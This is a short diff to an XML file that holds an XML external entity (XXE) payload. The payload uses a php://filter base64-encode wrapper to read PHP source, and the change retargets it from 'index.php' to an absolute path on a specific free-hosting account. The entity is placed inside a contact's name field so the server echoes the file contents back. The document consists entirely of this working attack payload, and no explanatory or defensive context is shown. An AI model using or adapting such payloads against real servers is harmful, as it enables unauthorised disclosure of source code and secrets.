@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/home/vol18_2/epizy.com/epiz_29076644/htdocs/api/index.php"> ]>
 <contacts>
   <contact>
     <name>Jean &xxe; Dupont</name>
